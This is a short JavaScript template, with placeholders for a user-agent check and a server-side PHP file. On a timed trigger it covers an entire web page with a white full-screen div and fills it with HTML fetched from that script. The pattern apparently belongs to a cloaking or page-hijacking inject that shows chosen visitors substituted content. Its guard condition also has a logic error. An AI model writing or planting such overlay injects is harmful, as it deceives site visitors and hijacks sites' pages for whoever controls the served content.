//---
function str_chk() {
    [USER_AGENT_CHECK]
}
function show(url) {
    if (document == undefined && document.body == undefined)
        return;
    //---
    window.clearInterval(interval);
    //---
    var div = document.createElement('DIV');
    with (div) {
        setAttribute('id', 'content');
        setAttribute('style', 'width: 100%; background-color: #FFF; height: 7000px; position: absolute; top: 0; left: 0;');
    }
    document.body.appendChild(div);
    load('[PHP-FILE]?url=' + encodeURIComponent(url));
}
//---
function load(url) {
    var req = getXmlHttp();
    req.onreadystatechange = function () {
        if (req.readyState == 4) {
            document.getElementById('content').innerHTML = req.responseText;
        }
    }
    //---
    req.open('GET', url, true);
    req.send(null);
}
//---
function getXmlHttp() {
    var xmlhttp;
    try {
        xmlhttp = new ActiveXObject("Msxml2.XMLHTTP");
    } catch (e) {
        try {
            xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
        } catch (E) {
            xmlhttp = false;
        }
    }
    if (!xmlhttp && typeof XMLHttpRequest != 'undefined') {
        xmlhttp = new XMLHttpRequest();
    }
    return xmlhttp;
}